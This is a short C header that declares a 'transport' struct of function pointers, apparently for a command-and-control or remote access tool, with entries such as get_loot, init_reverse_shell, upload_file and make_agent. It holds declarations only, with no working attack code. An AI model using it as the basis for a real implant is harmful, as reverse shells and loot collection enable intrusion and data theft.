#pragma once

#include "common.h"
#include "typedefs.h"

typedef struct _transport {
    // generic protocol functions for use in the main handler
    int (*send_ok)();
    int (*send_err)();
    int (*listen)();
    int (*read)(char **buff, int length);
    int (*write)(char *buff, int length);

    int (*get_loot)(char *loot);
    int (*upload_file)(char *ptr, int is_module);
    int (*init_reverse_shell)(char *id);
    int (*determine_handler)();
    
    int (*init)(pClientDat dat);
    int (*end)();

    int (*make_agent)(char *dat_ptr, char *d_ptr);
    pClientDat (*get_data)();
    char* (*get_name)();
    int (*get_id)();
    void (*set_port)(int portno);
} transport_t, *ptransport_t;

